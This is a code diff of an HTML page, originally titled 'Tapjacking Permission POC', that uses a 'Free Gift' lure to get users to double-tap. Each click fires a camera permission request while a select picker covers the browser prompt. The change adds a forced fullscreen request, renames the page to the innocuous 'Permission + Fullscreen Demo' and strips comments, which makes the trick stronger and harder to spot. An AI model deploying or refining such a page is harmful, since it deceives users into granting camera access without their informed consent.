@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tapjacking Permission POC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  
+  <title>Permission + Fullscreen Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
     body {
       margin: 10vh 10vw;
@@ -27,7 +27,6 @@
       opacity: 0;
     }
 
-    /* 👇 NEW: circle button */
     .circle-btn {
       position: absolute;
       bottom: 20%;
@@ -35,26 +34,26 @@
       width: 60px;
       height: 60px;
       border-radius: 50%;
-      background-color: #ff4444;
+      background-color: red;
       border: none;
-      cursor: pointer;
     }
   </style>
 
   <script>
-    function requestCameraPermission() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function () {
-          console.log('Camera permission granted.');
-        })
-        .catch(function (error) {
-          console.error('Error accessing the camera:', error);
-        });
-    }
+    function handleClick(event) {
 
-    function handleClick() {
-      requestCameraPermission();
-      setTimeout(function() {
+      // ✅ fullscreen MUST be here (direct click)
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(()=>{});
+      }
+
+      // camera permission
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(() => console.log("Camera allowed"))
+        .catch(() => console.log("Denied"));
+
+      // popup
+      setTimeout(() => {
         document.getElementById("selectme").showPicker();
       }, 250);
     }
@@ -64,28 +63,25 @@
 <body>
 
 <center>
-  <button onclick="handleClick()">
+  <button onclick="handleClick(event)">
     🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩 = 🎁] the Green Box to Win a Free Gift! 🎉
   </button>
 </center>
 
-<div>
-  <select id="selectme">
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟩 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
-  </select>
-</div>
+<select id="selectme">
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟩 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+  <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+</select>
 
-<!-- 👇 NEW circle button -->
 <button class="circle-btn"></button>
 
 </body>
